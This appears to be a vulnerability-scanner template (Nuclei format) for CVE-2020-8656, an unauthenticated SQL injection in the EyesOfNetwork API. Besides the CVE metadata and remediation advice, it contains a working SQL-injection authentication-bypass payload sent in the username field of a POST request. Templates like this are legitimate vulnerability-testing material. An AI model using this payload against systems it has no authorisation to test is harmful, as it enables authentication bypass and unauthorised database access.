id: CVE-2020-8656

info:
  name: SQL Injection in EyesOfNetwork API
  author: ProjectDiscoveryAI
  severity: critical
  description: An issue was discovered in EyesOfNetwork 5.3. The EyesOfNetwork API 2.4.2 is prone to SQL injection, allowing an unauthenticated attacker to perform various tasks such as authentication bypass via the username field to getApiKey in include/api_functions.php.
  impact: |
    Allows attackers to execute malicious SQL queries and potentially gain unauthorized access to the database.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version to mitigate the SQL Injection vulnerability in EyesOfNetwork API.
  reference:
    - https://github.com/EyesOfNetworkCommunity/eonapi/issues/16
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ArianeBlow/EyesOfNetwork-vuln-checker
    - https://github.com/h4knet/eonrce
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-8656
    cwe-id: CWE-89
    epss-score: 0.07701
    epss-percentile: 0.94429
    cpe: cpe:2.3:a:eyesofnetwork:eyesofnetwork:5.3-0:*:*:*:*:*:*:*
  metadata:
    vendor: eyesofnetwork
    product: eyesofnetwork

http:
  - method: POST
    path:
      - "{{BaseURL}}/include/api_functions.php"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "username=admin' OR '1'='1'-- -&password="
    matchers:
      - type: word
        words:
          - "apiKey"
        part: body
